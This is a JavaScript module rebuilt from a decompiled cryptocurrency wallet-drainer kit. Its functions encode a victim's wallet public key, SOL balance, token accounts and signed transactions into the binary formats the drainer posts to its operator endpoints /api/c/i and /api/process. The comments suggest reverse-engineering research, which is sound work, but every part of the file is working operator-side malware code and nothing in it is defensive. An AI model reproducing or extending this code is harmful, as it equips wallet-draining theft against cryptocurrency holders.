/**
 * rebuilt/operator/payloads.js
 *
 * Binary payload builders for /api/process and /api/c/i.
 *
 * Sources:
 *   - decompiled/kit/operator/payloads.js
 *   - bundle.deobfuscated.js lines 20476–20631 (醭, 焖, 詯, 措)
 *   - GAP_CLOSURE_2026-11-14.md (confirmed layouts)
 *   - decompiled/live/dynamic/captured_tx_2026-11-12.json (wire evidence)
 */

'use strict';

const {
  crc32, writeU16, writeU32, writeU64, writePubkey,
  packByteArrays, base58Decode, randomInt,
} = require('../core/crypto');

// ── encodeAccounts (詯) ───────────────────────────────────────────────────
/**
 * encodeAccounts(entries):
 *   entries is an array of account descriptor objects from the state.
 *   Each entry has a .type (0 or 2) and associated pubkey fields.
 *
 *   type 0 (token account entry):
 *     out: 1 byte type + 1 byte J-flag + 32 bytes q (mint) + 32 bytes de (token account)
 *     total: 65 bytes per entry
 *
 *   type 2 (simple account):
 *     out: 1 byte type + 32 bytes e (pubkey)
 *     total: 33 bytes per entry
 *
 *   Preceded by 1-byte count.
 *
 *   Real captured data: state.he.lr for /c/i, state.he.Fe for /process.
 */
function encodeAccounts(entries) {
  if (!entries || entries.length === 0) return new Uint8Array([0]);

  let size = 1; // count byte
  for (const entry of entries) {
    size += 1; // type byte
    if (entry.type === 0) size += 65; // J-flag (1) + q (32) + de (32)
    if (entry.type === 2) size += 32; // e (32)
  }

  const out = new Uint8Array(size);
  let offset = 0;
  out[offset++] = entries.length;

  for (const entry of entries) {
    out[offset++] = entry.type;
    if (entry.type === 0) {
      out[offset++] = entry.J ? 1 : 0;
      writePubkey(out, offset, entry.q);  offset += 32;  // mint
      writePubkey(out, offset, entry.de); offset += 32;  // token account
    } else if (entry.type === 2) {
      writePubkey(out, offset, entry.e);  offset += 32;
    }
  }
  return out;
}

// ── buildConnectPayload (醭) ──────────────────────────────────────────────
/**
 * /api/c/i plaintext payload (encrypted before posting).
 * Confirmed layout (GAP_CLOSURE_2026-11-14.md):
 *
 *   bytes  0–14:   15 random bytes  (nonce)
 *   bytes 15–22:   u64 LE           SOL amount in lamports (Math.trunc)
 *   bytes 23–54:   32 bytes         victim wallet pubkey
 *   bytes 55–N:    encodeAccounts() account list
 *   bytes N–N+3:   u32 LE           CRC32 of everything before it
 *
 * Total fixed size before account list: 55 + 4 = 59 bytes (绾 = CONNECT_HEADER = 59)
 */
function buildConnectPayload(victimPubkey, solAmountLamports, accountEntries) {
  const accounts = encodeAccounts(accountEntries);
  // 59 bytes fixed + account list (CRC is included in that 59: 15 + 8 + 32 + 4)
  const bodyLen  = 15 + 8 + 32 + accounts.length;
  const out      = new Uint8Array(bodyLen + 4); // + CRC

  let offset = 0;

  // 15 random bytes
  for (; offset < 15; offset++) out[offset] = randomInt(0, 255);

  // u64 LE: SOL lamports
  writeU64(out, typeof solAmountLamports === 'bigint' ? solAmountLamports : BigInt(Math.trunc(Number(solAmountLamports))), offset); offset += 8;

  // 32-byte victim pubkey
  writePubkey(out, offset, victimPubkey); offset += 32;

  // account list
  out.set(accounts, offset); offset += accounts.length;

  // CRC32 over all bytes before the checksum
  const checksum = crc32(out.subarray(0, offset));
  writeU32(out, checksum, offset);

  return out;
}

// ── buildProcessPayload (焖) ──────────────────────────────────────────────
/**
 * /api/process body (sent as base64 text/plain).
 * Confirmed layout:
 *
 *   bytes  0–12:   13 random bytes  (nonce)
 *   bytes 13–16:   u32 LE           attempt counter (global state.ne, 0 if unset)
 *   bytes 17–48:   32 bytes         victim wallet pubkey
 *   byte  49:      u8               flow type (state.he.be)
 *   bytes 50–51:   u16 LE           length of packed transaction section (tx_section.length)
 *   bytes 52–N:    packByteArrays() signed transactions
 *   bytes N–end:   packByteArrays() account pubkeys (base58-decoded)
 *
 * Header size 緢 = 52 (confirmed deob line 20618).
 */
function buildProcessPayload(victimPubkey, attemptCounter, signedTxs, flowByte, accountAddresses) {
  const txSection  = packByteArrays(signedTxs);
  const acctBytes  = accountAddresses.map(addr => base58Decode(addr));
  const acctSection = packByteArrays(acctBytes);

  const HEADER_SIZE = 52; // 緢
  const out = new Uint8Array(HEADER_SIZE + txSection.length + acctSection.length);

  // 13 random bytes
  for (let i = 0; i < 13; i++) out[i] = randomInt(0, 255);
  let offset = 13;

  // u32 LE: attempt counter
  writeU32(out, attemptCounter >>> 0, offset); offset += 4;

  // 32-byte victim pubkey
  writePubkey(out, offset, victimPubkey); offset += 32;

  // flow type byte
  out[offset++] = flowByte & 0xFF;

  // u16 LE: tx section length
  writeU16(out, txSection.length, offset); offset += 2;

  // packed transactions
  out.set(txSection, offset);  offset += txSection.length;

  // packed account pubkeys
  out.set(acctSection, offset);

  return out;
}

module.exports = { encodeAccounts, buildConnectPayload, buildProcessPayload };
